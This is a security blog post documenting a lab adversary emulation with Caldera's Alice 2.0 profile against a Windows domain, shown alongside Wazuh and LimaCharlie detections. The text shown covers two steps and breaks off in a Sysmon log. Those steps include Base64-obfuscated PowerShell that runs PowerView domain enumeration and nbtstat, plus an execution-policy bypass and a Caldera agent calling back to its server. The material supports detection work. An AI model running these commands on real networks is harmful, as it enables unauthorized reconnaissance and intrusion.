@@ -1,0 +1,874 @@
+<!doctype html><html lang=en-us><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>[EN] Caldera Alice 2.0 Adversary Emulation | ittechnetworkk</title><link rel=canonical href=https://ittechnetworkk.github.io/posts/caldera_alice2.0_attack_scenario/calderaalice2.0/><meta name=description content="Hi, I'm Soner, and this is my personal blog where I share insights, guides, and articles on various tech topics, including Networking, Linux, Windows, Virtualization, Firewalls, IoT, and more. I'm constantly learning and exploring new technologies, and this blog is where I document my journey. "><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://ittechnetworkk.github.io/posts/caldera_alice2.0_attack_scenario/calderaalice2.0/"><meta property="og:site_name" content="ittechnetworkk"><meta property="og:title" content="[EN] Caldera Alice 2.0 Adversary Emulation"><meta property="og:description" content="I will perform an attack scenario using Caldera and will show its effects in Wazuh (SIEM/XDR) and LimaCharlie (EDR).
+LimaCharlie can integrate with the Atomic Red Team extension, which I will use in Caldera to perform the attack. Therefore, you don’t need to install Atomic Red Team separately.
+In my lab environment for this attack scenario, I have a Client1 machine and an AD-DC machine, and I have already installed Caldera agents on both."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-30T19:28:28+02:00"><meta property="article:modified_time" content="2025-09-30T19:28:28+02:00"><meta property="article:tag" content="Caldera"><meta property="article:tag" content="Wazuh"><meta property="article:tag" content="Limacharlie"><meta property="article:tag" content="Edr"><meta property="article:tag" content="Windows"><meta property="article:tag" content="SIEM"><meta name=twitter:card content="summary"><meta name=twitter:title content="[EN] Caldera Alice 2.0 Adversary Emulation"><meta name=twitter:description content="I will perform an attack scenario using Caldera and will show its effects in Wazuh (SIEM/XDR) and LimaCharlie (EDR).
+LimaCharlie can integrate with the Atomic Red Team extension, which I will use in Caldera to perform the attack. Therefore, you don’t need to install Atomic Red Team separately.
+In my lab environment for this attack scenario, I have a Client1 machine and an AD-DC machine, and I have already installed Caldera agents on both."><link rel=stylesheet href=https://ittechnetworkk.github.io/css/styles.bdd621ce0dc4beed42cba9d295fbb7a846b8870c3fda65b870471926d718c2543ebb5d8d248ba9a5554cba6ec2e05b0dc829190fd4e4fef576beaa4c3f244abe.css integrity="sha512-vdYhzg3Evu1Cy6nSlfu3qEa4hww/2mW4cEcZJtcYwlQ+u12NJIuppVVMum7C4FsNyCkZD9Tk/vV2vqpMPyRKvg=="><link rel=stylesheet href=https://ittechnetworkk.github.io/css/custom.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/lightbox.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/tools.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/tools-cards.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/post-cards.css><link rel=stylesheet href=https://ittechnetworkk.github.io/css/posts-cards.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://ittechnetworkk.github.io/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+<span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/walkthroughs>Walkthroughs</a></li><li><a href=/projects>Projects</a></li><li><a href=/tools/>Tools</a></li><li><a href=/resources>Resources</a></li><li><a href=/library>Library</a></li><li><a href=/about>About</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://ittechnetworkk.github.io/posts/yararules/yararules/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&text=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&title=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&is_video=false&description=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation&body=Check out this article: https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&title=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&title=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&name=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation&description=%3cp%3eI%20will%20perform%20an%20attack%20scenario%20using%20Caldera%20and%20will%20show%20its%20effects%20in%20Wazuh%20%28SIEM%2fXDR%29%20and%20LimaCharlie%20%28EDR%29.%3c%2fp%3e%0a%3cp%3eLimaCharlie%20can%20integrate%20with%20the%20Atomic%20Red%20Team%20extension%2c%20which%20I%20will%20use%20in%20Caldera%20to%20perform%20the%20attack.%20Therefore%2c%20you%20don%26rsquo%3bt%20need%20to%20install%20Atomic%20Red%20Team%20separately.%3c%2fp%3e%0a%3cp%3eIn%20my%20lab%20environment%20for%20this%20attack%20scenario%2c%20I%20have%20a%20Client1%20machine%20and%20an%20AD-DC%20machine%2c%20and%20I%20have%20already%20installed%20Caldera%20agents%20on%20both.%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&t=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#step-1---discover-local-hosts>Step 1 - Discover local hosts:</a></li><li><a href=#step-2---find-domain>Step 2 - Find Domain:</a></li><li><a href=#step-3---discover-admins>Step 3 - Discover Admins:</a></li><li><a href=#step-4---powercatz>Step 4 - Powercatz:</a></li><li><a href=#step-5---remote-host-ping>Step 5 - Remote Host Ping:</a></li><li><a href=#step-6---account-type-admin-enumeration>Step 6 - Account-type Admin Enumeration:</a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">[EN] Caldera Alice 2.0 Adversary Emulation</h1><div class=meta><div class=author-info style=font-size:1.1em;margin-bottom:10px><span class=author itemprop=author itemscope itemtype=http://schema.org/Person><strong>Author:</strong> <span itemprop=name>Soner Sahin</span></span></div><div class=postdate><time datetime="2025-09-30 19:28:28 +0200 CEST" itemprop=datePublished>2025-09-30</time></div><div class=article-read-time><i class="far fa-clock"></i>
+16 minute read</div><div class=article-category><i class="fas fa-archive"></i>
+<a class=category-link href=/categories/soc>SOC</a></div><div class=article-tag><i class="fas fa-tag"></i>
+<a class=tag-link href=/tags/caldera rel=tag>caldera</a>
+,
+<a class=tag-link href=/tags/wazuh rel=tag>wazuh</a>
+,
+<a class=tag-link href=/tags/limacharlie rel=tag>limacharlie</a>
+,
+<a class=tag-link href=/tags/edr rel=tag>edr</a>
+,
+<a class=tag-link href=/tags/windows rel=tag>windows</a>
+,
+<a class=tag-link href=/tags/siem rel=tag>siem</a>
+,
+<a class=tag-link href=/tags/soc rel=tag>soc</a></div></div></header><div class=content itemprop=articleBody><p>I will perform an attack scenario using Caldera and will show its effects in Wazuh (SIEM/XDR) and LimaCharlie (EDR).</p><p>LimaCharlie can integrate with the Atomic Red Team extension, which I will use in Caldera to perform the attack. Therefore, you don&rsquo;t need to install Atomic Red Team separately.</p><p>In my lab environment for this attack scenario, I have a Client1 machine and an AD-DC machine, and I have already installed Caldera agents on both.</p><p>Here is the basic topology.</p><ul><li><strong>client1 (Win10)</strong></li><li><strong>AD-DC (WinSRV2022)</strong></li><li><strong>Wazuh XDR/SIEM</strong></li><li><strong>LimaCharlie EDR</strong></li></ul><p>Here is the adversary template and attack scenario:</p><p><img src=/images/calderaalice/1.png alt=alice></p><p>I&rsquo;m going to use the &ldquo;Alice 2.0&rdquo; adversary template, which is a typical end-to-end attack scenario. I will run the attack through step 6; the remaining steps will not be executed.</p><p>In this case, I will make things a bit easier by starting and ending the attack within a defined time window and preparing the attack timeline across platforms. Thus, we will be able to focus on the effects of the attack.</p><p>Now, I will create a new operation as follows.</p><p><img src=/images/calderaalice/2.png alt=alice></p><p>The attack will be triggered as soon as I click the &ldquo;Start&rdquo; button and will be performed step by step automatically and as soon as it is done we will start investigating step by step.</p><p>As you can see in the image above, I will use Base64 as an obfuscator, which makes commands harder to read at a glance. I will include the decoded version of each command.</p><p>Let&rsquo;s do it.</p><p><strong>Timeline:</strong></p><pre tabindex=0><code>Sep 30, 2025 @ 11:20:50 --- Sep 30, 2025 @ 11:33:00
+</code></pre><p><img src=/images/calderaalice/3.png alt=alice></p><h2 id=step-1---discover-local-hosts>Step 1 - Discover local hosts:</h2><p><strong>Base64:</strong></p><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG8AbQBhAGkAbgBDAG8AbQBwAHUAdABlAHIA
+</code></pre><p><strong>Decoded:</strong></p><pre tabindex=0><code>Import-Module .\powerview.ps1;Get-DomainComputer
+</code></pre><p><strong>Command Output:</strong></p><pre tabindex=0><code>| Name             | Value                   | Score |
+| ---------------- | ----------------------- | ----- |
+| remote.host.fqdn | ad-dc.ssnrshnn.local    | 4     |
+| remote.host.fqdn | client1.ssnrshnn.local  | 4     |
+| remote.host.fqdn | client2.ssnrshnn.local  | 4     |
+| remote.host.fqdn | exchange.ssnrshnn.local | 4     |
+</code></pre><p><strong>LimaCharlie:</strong></p><p>Here is LimaCharlie&rsquo;s <strong>Timeline</strong> section, where you can find processes, DNS activity, network activity, and more in order.</p><p>As mentioned, there is a process called <strong>Client1.exe</strong> that lets us communicate with Caldera, and the commands will be executed through that process.</p><p>Here is the timeline of the process creation.</p><p><img src=/images/calderaalice/4.png alt=alice></p><p><strong>Event File:</strong></p><p>Here is the event file for the relevant process. The parent process is <strong>Client1.exe</strong>.</p><p><img src=/images/calderaalice/5.png alt=alice></p><p><strong>LimaCharlie Detection:</strong></p><p>Here is the output of LimaCharlie&rsquo;s Detections section for the first step. I disabled the Endpoint Protection Platform (<strong>ext-epp</strong>) to avoid quarantine actions and analyze the activity properly.</p><p>I enabled all default detection rules. I will present a sample for each step. The rules function as expected; additionally, the <strong>ext-epp</strong> module works well too.</p><p><img src=/images/calderaalice/6.png alt=alice></p><p><strong>Detection Rules that are matched with relevant process:</strong></p><ul><li><strong>ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0</strong></li><li><strong>soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a</strong></li></ul><p><strong>Wazuh Output:</strong></p><p><img src=/images/calderaalice/7.png alt=alice></p><p><img src=/images/calderaalice/8.png alt=alice></p><p><strong>Sysmon Output:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:21:33.369
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a11d-68db-0805-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 6536
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: Windows PowerShell
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: PowerShell.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc SQBtAHAAbwByAHQALQBNAG<span style=color:#bd93f9>8</span>AZAB<span style=color:#bd93f9>1</span>AGwAZQAgAC<span style=color:#bd93f9>4</span>AXABwAG<span style=color:#bd93f9>8</span>AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG<span style=color:#bd93f9>8</span>AbQBhAGkAbgBDAG<span style=color:#bd93f9>8</span>AbQBwAHUAdABlAHIA<span style=color:#f1fa8c>&#34;
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 8008
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Users\Public\Client1.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red 
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><p>As you would have noticed that this is the first alert of the first command. Other than suricata traffic, Wazuh side is quieter as relatively default.</p><h2 id=step-2---find-domain>Step 2 - Find Domain:</h2><p><strong>Base64:</strong></p><pre tabindex=0><code>powershell -Enc bgBiAHQAcwB0AGEAdAAgAC0AbgA=
+</code></pre><p><strong>Decoded:</strong></p><pre tabindex=0><code>nbtstat -n
+</code></pre><p><strong>Command Output:</strong></p><pre tabindex=0><code>Ethernet:
+Node IpAddress: [10.1.2.10] Scope Id: []
+
+                NetBIOS Local Name Table
+
+       Name               Type         Status
+    ---------------------------------------------
+    CLIENT1        &lt;00&gt;  UNIQUE      Registered 
+    SSNRSHNN       &lt;00&gt;  GROUP       Registered 
+    CLIENT1        &lt;20&gt;  UNIQUE      Registered
+</code></pre><p><strong>LimaCharlie:</strong></p><p><strong>nbtstat -n</strong> command is used for find the domain name. Here is its process.</p><p><img src=/images/calderaalice/9.png alt=alice></p><p><strong>Process Tree:</strong></p><p>With Tree View feature of the LimaCharlie, caching processes, sub processes are pretty easy and helps us to see the big picture.</p><p><img src=/images/calderaalice/10.png alt=alice></p><p><strong>LimaCharlie Detection:</strong></p><p>In the <strong>Detection</strong> section, rules are doing their job well, and as you may realize, more than one rule has been triggered for the same process.</p><p><img src=/images/calderaalice/11.png alt=alice></p><p><strong>Detection Rules that are matched with relevant process:</strong></p><ul><li><strong>ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0</strong></li><li><strong>soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a</strong></li></ul><p><strong>Wazuh Output:</strong></p><p><img src=/images/calderaalice/12.png alt=alice></p><p><img src=/images/calderaalice/13.png alt=alice></p><p><strong>Sysmon Output:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:22:20.277
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a14c-68db-0d05-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 7132
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: Windows PowerShell
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: PowerShell.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc bgBiAHQAcwB<span style=color:#bd93f9>0</span>AGEAdAAgAC<span style=color:#bd93f9>0</span>AbgA=<span style=color:#f1fa8c>&#34;
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 8008
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Users\Public\Client1.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red 
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><p>Below you can see the relevant command which is <strong>nbtstat -n</strong></p><p><img src=/images/calderaalice/133.png alt=alice></p><p><strong>Sysmon Output:</strong></p><p>Sysmon output for the <strong>nbtstat -n</strong> command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:22:20.609
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a14c-68db-0f05-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 9948
